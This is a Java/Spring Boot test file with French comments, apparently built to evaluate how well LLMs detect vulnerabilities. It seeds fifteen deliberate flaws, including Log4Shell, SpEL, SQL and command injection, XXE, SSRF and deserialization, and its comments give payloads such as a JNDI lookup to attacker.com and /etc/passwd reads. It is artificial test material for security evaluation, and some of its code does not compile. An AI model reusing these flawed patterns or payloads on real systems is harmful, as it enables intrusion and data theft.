/**
 * FICHIER DE TEST — VULNÉRABILITÉS INTENTIONNELLES (JAVA)
 * Usage : évaluation LLM — détection de failles Java / Spring Boot
 * Couvre : Log4Shell, Deserialization, SSRF, XXE, Spring EL Injection,
 *          SQL Injection JDBC, Path Traversal, Insecure Deserialization,
 *          Weak Crypto, Command Injection, IDOR, Exposed Actuators
 * NE PAS déployer en production.
 */

import java.io.*;
import java.net.*;
import java.sql.*;
import java.util.*;
import java.lang.Runtime;
import javax.xml.parsers.*;
import org.apache.logging.log4j.*;
import org.springframework.web.bind.annotation.*;
import org.springframework.expression.*;
import org.springframework.expression.spel.standard.*;
import java.security.*;
import javax.crypto.*;
import java.util.Base64;

// ═══════════════════════════════════════════════════════════════════════
// 1. LOG4SHELL — CVE-2021-44228 (CVSS 10.0 / Critique)
// ═══════════════════════════════════════════════════════════════════════
// Payload : ${jndi:ldap://attacker.com:1389/exploit}
// Variantes : ${jndi:rmi://...}, ${jndi:dns://...}
// Obfuscation : ${${lower:j}ndi:...}, ${${::-j}${::-n}${::-d}${::-i}:...}
@RestController
public class VulnerableController {

    private static final Logger logger = LogManager.getLogger(VulnerableController.class);

    @GetMapping("/search")
    public String search(@RequestParam String query) {
        logger.info("User searched for: " + query); // Log4Shell ici
        // Le logger résout les ${...} avant d'écrire → RCE via JNDI lookup
        return "Results for: " + query;
    }

    // ═══════════════════════════════════════════════════════════════════
    // 2. SPRING EL INJECTION (SpEL)
    // ═══════════════════════════════════════════════════════════════════
    // Payload : T(java.lang.Runtime).getRuntime().exec('id')
    @GetMapping("/eval")
    public String evalExpression(@RequestParam String expr) {
        ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression(expr); // SpEL avec input utilisateur
        return exp.getValue().toString();
    }

    // ═══════════════════════════════════════════════════════════════════
    // 3. SQL INJECTION — JDBC sans PreparedStatement
    // ═══════════════════════════════════════════════════════════════════
    @GetMapping("/user")
    public String getUser(@RequestParam String username) throws SQLException {
        Connection conn = DriverManager.getConnection("jdbc:mysql://localhost/app", "root", "root");
        Statement stmt = conn.createStatement();
        // Payload : admin' OR '1'='1' --
        ResultSet rs = stmt.executeQuery("SELECT * FROM users WHERE username = '" + username + "'");
        return rs.next() ? rs.getString("email") : "not found";
    }

    // ═══════════════════════════════════════════════════════════════════
    // 4. INSECURE DESERIALIZATION — Java Native Serialization
    // ═══════════════════════════════════════════════════════════════════
    // Gadget chains : Apache Commons Collections (ysoserial)
    // Payload généré avec : java -jar ysoserial.jar CommonsCollections1 "calc.exe"
    @PostMapping("/restore-session")
    public Object restoreSession(@RequestBody byte[] sessionData) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(sessionData));
        return ois.readObject(); // désérialisation non sécurisée → RCE
    }

    // ═══════════════════════════════════════════════════════════════════
    // 5. XXE — XML External Entity (Java SAX/DOM)
    // ═══════════════════════════════════════════════════════════════════
    // Payload :
    // <?xml version="1.0"?>
    // <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    // <user><name>&xxe;</name></user>
    @PostMapping("/import")
    public String importXml(@RequestBody String xmlBody) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        // Pas de : factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
        DocumentBuilder builder = factory.newDocumentBuilder();
        Document doc = builder.parse(new InputSource(new StringReader(xmlBody)));
        return doc.getDocumentElement().getTextContent();
    }

    // ═══════════════════════════════════════════════════════════════════
    // 6. COMMAND INJECTION — Runtime.exec()
    // ═══════════════════════════════════════════════════════════════════
    // Payload : ; cat /etc/passwd ou && whoami
    @GetMapping("/ping")
    public String pingHost(@RequestParam String host) throws Exception {
        Process p = Runtime.getRuntime().exec("ping -c 1 " + host); // injection
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) sb.append(line);
        return sb.toString();
    }

    // ═══════════════════════════════════════════════════════════════════
    // 7. PATH TRAVERSAL — lecture de fichier arbitraire
    // ═══════════════════════════════════════════════════════════════════
    // Payload : ../../../../etc/passwd ou ../../WEB-INF/web.xml
    @GetMapping("/download")
    public byte[] downloadFile(@RequestParam String filename) throws IOException {
        File file = new File("/var/www/uploads/" + filename); // traversal possible
        return java.nio.file.Files.readAllBytes(file.toPath());
    }

    // ═══════════════════════════════════════════════════════════════════
    // 8. SSRF — Server-Side Request Forgery (Java URL)
    // ═══════════════════════════════════════════════════════════════════
    // Payload : http://169.254.169.254/latest/meta-data/ (AWS EC2 metadata)
    //         : file:///etc/passwd
    //         : http://localhost:8080/actuator/env
    @GetMapping("/fetch")
    public String fetchUrl(@RequestParam String url) throws IOException {
        URL targetUrl = new URL(url); // aucune validation de l'hôte
        URLConnection conn = targetUrl.openConnection();
        return new String(conn.getInputStream().readAllBytes());
    }

    // ═══════════════════════════════════════════════════════════════════
    // 9. WEAK CRYPTOGRAPHY — DES, ECB mode, MD5 password
    // ═══════════════════════════════════════════════════════════════════
    private static final byte[] HARD_CODED_KEY = "12345678".getBytes(); // DES key en dur

    public static String encryptDes(String plaintext) throws Exception {
        Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding"); // DES obsolète, ECB mode
        SecretKeySpec key = new SecretKeySpec(HARD_CODED_KEY, "DES");
        cipher.init(Cipher.ENCRYPT_MODE, key);
        return Base64.getEncoder().encodeToString(cipher.doFinal(plaintext.getBytes()));
    }

    public static String hashPassword(String password) throws NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance("MD5"); // MD5 — pas de sel, cassable
        return Base64.getEncoder().encodeToString(md.digest(password.getBytes()));
    }

    // ═══════════════════════════════════════════════════════════════════
    // 10. SPRING ACTUATOR EXPOSÉ — Information Disclosure
    // ═══════════════════════════════════════════════════════════════════
    // application.properties (simulé en commentaire) :
    //
    // management.endpoints.web.exposure.include=*     ← tous les endpoints exposés
    // management.endpoint.env.enabled=true            ← variables d'env exposées
    // management.endpoint.heapdump.enabled=true       ← heap dump téléchargeable
    // management.endpoint.shutdown.enabled=true       ← arrêt à distance via POST
    //
    // GET /actuator/env → révèle toutes les env vars (tokens, passwords)
    // GET /actuator/heapdump → heap dump Java → extraction de secrets
    // POST /actuator/shutdown → arrêt du serveur (DoS)
    // GET /actuator/mappings → carte complète des routes

    // ═══════════════════════════════════════════════════════════════════
    // 11. IDOR — Accès direct sans contrôle d'autorisation
    // ═══════════════════════════════════════════════════════════════════
    @GetMapping("/invoice/{id}")
    public String getInvoice(@PathVariable Long id) throws SQLException {
        Connection conn = DriverManager.getConnection("jdbc:mysql://localhost/app", "root", "root");
        PreparedStatement stmt = conn.prepareStatement("SELECT * FROM invoices WHERE id = ?");
        stmt.setLong(1, id);
        ResultSet rs = stmt.executeQuery();
        // aucune vérification que l'utilisateur courant est propriétaire de la facture
        return rs.next() ? rs.getString("content") : "not found";
    }

    // ═══════════════════════════════════════════════════════════════════
    // 12. JWT — ALGORITHM CONFUSION ATTACK (RS256 → HS256)
    // ═══════════════════════════════════════════════════════════════════
    // Attaque : changer l'algo de RS256 (asymétrique) à HS256 (symétrique)
    // puis signer avec la clé publique RSA (connue) → forge de token valide
    public boolean verifyJwtInsecure(String token, PublicKey pubKey) {
        String[] parts = token.split("\\.");
        String header = new String(Base64.getDecoder().decode(parts[0]));
        // Si le code extrait l'algo du header et l'utilise → algorithm confusion
        // Un attaquant met {"alg":"HS256"} et signe avec la clé publique RSA
        // La clé publique étant connue → forge possible
        return true; // vérification tronquée pour illustration
    }

    // ═══════════════════════════════════════════════════════════════════
    // 13. MASS ASSIGNMENT — Spring @ModelAttribute
    // ═══════════════════════════════════════════════════════════════════
    @PostMapping("/register")
    public String register(@ModelAttribute User user) {
        // Si User a un champ "isAdmin=false", l'attaquant peut POST isAdmin=true
        // Spring binding va automatiquement setter le champ
        userService.save(user);
        return "registered";
    }

    // ═══════════════════════════════════════════════════════════════════
    // 14. OPEN REDIRECT — Spring Security misconfiguration
    // ═══════════════════════════════════════════════════════════════════
    @GetMapping("/redirect")
    public String redirect(@RequestParam String url) {
        return "redirect:" + url; // ?url=https://evil.com → phishing
    }

    // ═══════════════════════════════════════════════════════════════════
    // 15. INSECURE RANDOM — java.util.Random pour token de sécurité
    // ═══════════════════════════════════════════════════════════════════
    public String generateResetToken() {
        Random random = new Random(); // non cryptographique — prédictible
        // Correction : SecureRandom
        return Long.toHexString(random.nextLong());
    }
}
